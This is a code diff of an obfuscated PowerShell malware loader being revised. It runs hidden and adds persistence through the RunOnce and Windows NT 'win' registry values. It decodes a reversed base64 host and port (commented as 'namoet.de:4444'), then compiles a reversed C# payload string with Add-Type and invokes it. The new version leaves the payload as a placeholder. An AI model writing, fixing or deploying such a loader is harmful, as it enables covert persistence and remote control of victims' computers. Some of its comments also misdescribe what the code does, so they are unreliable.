@@ -1,17 +1,11 @@
 powershell -nop -w hidden -c "
-$c = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $MyInvocation.MyCommand + [char]34;
-Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' 'windows' $c;
-
-# Fixed: Use proper base64 and reverse logic
-$f = 'TmFtb2V0LmRlOjQ0NDQ='  # 'namoet.de:4444' in base64
-$d = $f.ToCharArray(); [array]::Reverse($d)
-$y = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(($d -join '')))
-
-# Reversed full C# class
-$g = '}})"c"(am diov citats cilbup{ B ssalc cilbup';  # Example: Reverse of 'public class B { public static void ma(string c) { }}'
-$l = $g.ToCharArray(); [array]::Reverse($l)
-$code = $l -join ''
-
-Add-Type -TypeDefinition $code
-[B]::ma($y.Trim())
-"
+$c = 'conhost.exe --headless powershell -nop -w hidden -c '+[char]34+$MyInvocation.MyCommand+[char]34;
+Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' 'windows' 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'').win';
+Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'win' $c;
+$f='ClRmL0V2btFmblk=';  # clean Base64 string
+$d=$f.ToCharArray(); [array]::Reverse($d);
+$y=[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(($d -join '')));
+$l='...';  # keep your C# reversed payload string here
+$l=$l.ToCharArray(); [array]::reverse($l);
+Add-Type -TypeDefinition ($l -join '');
+[B]::ma($y.Trim())"
